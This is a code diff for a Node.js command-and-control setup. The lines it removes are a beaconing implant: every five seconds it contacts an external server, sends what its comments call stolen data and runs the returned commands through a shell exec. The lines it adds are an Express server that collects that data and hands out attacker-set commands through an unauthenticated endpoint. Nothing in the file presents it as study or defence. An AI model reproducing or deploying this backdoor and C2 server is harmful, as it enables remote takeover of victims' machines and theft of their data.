@@ -1,68 +1,41 @@
-const C2_SERVER_URL = "https://mack-test-server.onrender.com"; // Replace with your actual C2 server URL
-const fetch = require('node-fetch');
-const { exec } = require('child_process');
+const express = require('express');
+const app = express();
 
-(async () => {
-  const dataExfiltrationEndpoint = `${C2_SERVER_URL}/data`; // Endpoint for sending stolen data
-  const commandFetchEndpoint = `${C2_SERVER_URL}/commands`; // Endpoint for fetching commands
+// Use cloud dynamic port or fallback to 8000
+const PORT = process.env.PORT || 8000;
 
-  setInterval(() => {
-    // 1. Send stolen data to C2 server (e.g., credentials, system info)
-    fetch(dataExfiltrationEndpoint, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        command: 'ping localhost' // Placeholder for any command (e.g., mining, ransomware)
-      })
-    }).then(response => response.json())
-      .then(data => {
-        if (data.command) {
-          exec(data.command, (error, stdout, stderr) => {
-            console.log('Executed:', data.command);
-            console.log('Output:', stdout);
-            if (error) {
-              console.error(`Error executing command: ${error}`);
-              return;
-            }
-            if (stderr) {
-              console.error(`Stderr executing command: ${stderr}`);
-              return;
-            }
-          });
-        }
-      })
-      .catch(error => {
-        console.error("❌ Failed to communicate with C2 server:", error);
-      });
+// Temporary memory to hold our data and commands
+let latestData = [];
+let currentCommand = { command: "STAY_IDLE", timestamp: new Date() };
 
-    // 2. Fetch pending commands from C2 server
-    fetch(commandFetchEndpoint, {
-      method: 'GET',
-      headers: {
-        'Accept': 'application/json'
-      }
-    }).then(response => response.json())
-      .then(data => {
-        if (data.action) {
-          console.log(`📡 Received Command: ${data.action}`);
-          exec(data.action, (error, stdout, stderr) => {
-            if (error) {
-              console.error(`Error executing command: ${error}`);
-              return;
-            }
-            if (stderr) {
-              console.error(`Stderr executing command: ${stderr}`);
-              return;
-            }
-            console.log("✅ Command executed successfully.");
-          });
-        }
-      })
-      .catch(error => {
-        console.error("❌ Failed to fetch command from C2 server:", error);
-      });
-  }, 5000); // Send beacon every 5 seconds
-})();
+app.use(express.json());
+
+// 1. Home route
+app.get('/', (req, res) => {
+    res.send('🚀 Sample Server is running perfectly on Koyeb!');
+});
+
+// 2. Endpoint to RECEIVE stolen data
+app.post('/data', (req, res) => {
+    const receivedData = req.body;
+    console.log("Received Data:", receivedData);
+    latestData.push({ ...receivedData, receivedAt: new Date() });
+    res.json({status: "success"});
+});
+
+// 3. Endpoint to FETCH the current command
+app.get('/commands', (req, res) => {
+    res.json(currentCommand);
+});
+
+// 4. Endpoint to SET a new command
+app.get('/set-command', (req, res) => {
+    const newCmd = req.query.cmd || "STAY_IDLE";
+    currentCommand = { command: newCmd, timestamp: new Date() };
+    res.send(`Command updated to: ${newCmd}`);
+});
+
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server is blasting off on port ${PORT}`);
+});
 
